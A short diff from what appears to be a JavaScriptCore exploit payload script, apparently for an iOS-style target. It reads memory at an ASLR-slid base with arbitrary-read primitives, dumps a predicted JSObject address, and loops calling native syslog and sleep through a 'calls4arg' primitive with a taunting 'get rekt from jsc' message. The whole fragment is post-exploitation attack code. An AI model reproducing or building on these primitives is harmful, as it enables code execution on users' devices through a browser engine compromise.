@@ -37,20 +37,14 @@ function main() {
 	puts("we out here");
 	puts("I came through a portal holding a 40 and a blunt. Do you really wanna test me right now?");
 
-	log("slide=0x" + slide.toString(16));
-	log("*(uint8_t*)base = 0x" + read_u8(base).toString(16));
-	log("*(uint16_t*)base = 0x" + read_u16(base).toString(16));
-	log("*(uint32_t*)base = 0x" + read_u32(base).toString(16));
-
-	predicted_jsobject_addy = 0x422200;
-	buf = read_buf(predicted_jsobject_addy, 0x200);
-
-	log("hexdump of predicted jsobject loc:");
-	log(hexdump(buf, 8, 2, predicted_jsobject_addy, 8, "0x"));
+	printf("slide=0x%x\n", slide);
+	printf("*(uint8_t*)base = 0x%x\n", read_u8(base));
+	printf("*(uint16_t*)base = 0x%x\n", read_u16(base));
+	printf("*(uint32_t*)base = 0x%x\n", read_u32(base));
 
 	var i = 0;
 	while (true) {
-		calls4arg("syslog\0", 0x28, sptr("get rekt from jsc %d (slide=%x)\n\0"), i, 0);
+		calls4arg("syslog", 0x28, sptr("get rekt from jsc %d (slide=%x)\n"), i, 0);
 		calls4arg("sleep", 0, 0, 0, 0);
 		i++;
 	}
